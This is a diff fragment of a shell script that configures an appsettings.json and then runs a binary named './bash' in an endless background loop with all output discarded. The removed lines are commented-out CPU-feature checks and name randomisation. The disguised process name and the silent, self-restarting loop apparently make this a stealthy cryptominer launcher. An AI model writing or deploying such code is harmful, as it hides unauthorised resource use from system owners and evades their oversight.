@@ -44,20 +44,9 @@ sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
 [ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"
 
 
-# cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX512'
-# [ "$?" == "0" ] && AVX512=1 || AVX512=0
-# cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
-# [ "$?" == "0" ] && [ "$AVX512" == "0" ] && AVX2=1 || AVX2=0
-# [ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "${work}/appsettings.json"
-# [ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "${work}/appsettings.json"
-
-
 if [ "$mode" == "0" ]; then
-  # name=`RandString 2 c${cores}_${addr}`;
-  # bash -c "while true; do cd "${work}"; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 7; done" >/dev/null 2>&1 &
   bash -c "while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done" >/dev/null 2>&1 &
 else
-  # while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 7; done
   while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done
 fi
 
